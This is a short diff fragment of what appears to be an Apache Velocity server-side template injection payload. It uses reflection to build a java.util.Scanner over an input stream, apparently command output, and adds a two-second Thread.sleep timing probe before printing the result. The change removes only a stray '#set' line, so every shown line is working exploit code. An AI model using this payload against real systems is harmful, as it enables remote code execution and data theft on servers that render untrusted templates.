@@ -6,7 +6,6 @@
 #set($constructor = $sc.getDeclaredConstructor($e.getClass().forName("java.io.InputStream")))
 #set($scan=$constructor.newInstance($input).useDelimiter("\\A"))
 #set($tmp1=$e.getClass().forName("java.lang.Thread").getMethod("sleep",long.class).invoke(null,2000))
-#set
 #if($scan.hasNext())
     $scan.next()
 #end
